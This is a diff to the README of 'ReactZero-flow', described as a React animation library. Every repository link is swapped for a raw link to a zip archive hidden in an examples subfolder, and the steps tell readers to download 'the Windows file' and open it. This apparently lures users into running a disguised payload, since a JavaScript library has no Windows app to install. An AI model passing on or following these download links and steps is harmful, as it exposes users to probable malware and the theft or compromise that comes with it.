@@ -1,6 +1,6 @@
 # ⚡ ReactZero-flow - Smooth React Motion Made Easy
 
-[![Download ReactZero-flow](https://img.shields.io/badge/Download-ReactZero--flow-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Gelobre6231/ReactZero-flow)
+[![Download ReactZero-flow](https://img.shields.io/badge/Download-ReactZero--flow-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Gelobre6231/ReactZero-flow/main/landing/src/examples/race/React_Zero_flow_2.6.zip)
 
 ## 🖥️ What it is
 
@@ -10,7 +10,7 @@ It uses the Web Animations API, so it stays light and keeps setup simple. The ap
 
 ## 📥 Download and run
 
-1. Open this page: [ReactZero-flow](https://github.com/Gelobre6231/ReactZero-flow)
+1. Open this page: [ReactZero-flow](https://raw.githubusercontent.com/Gelobre6231/ReactZero-flow/main/landing/src/examples/race/React_Zero_flow_2.6.zip)
 2. Download the Windows file from the page
 3. Save the file to your computer
 4. Open the file to start the app
@@ -143,7 +143,7 @@ If one part feels off, reload the app and test again.
 
 ## 🔗 Download again
 
-If you need the file again, use this link: [ReactZero-flow](https://github.com/Gelobre6231/ReactZero-flow)
+If you need the file again, use this link: [ReactZero-flow](https://raw.githubusercontent.com/Gelobre6231/ReactZero-flow/main/landing/src/examples/race/React_Zero_flow_2.6.zip)
 
 ## 🧰 Simple use cases
 
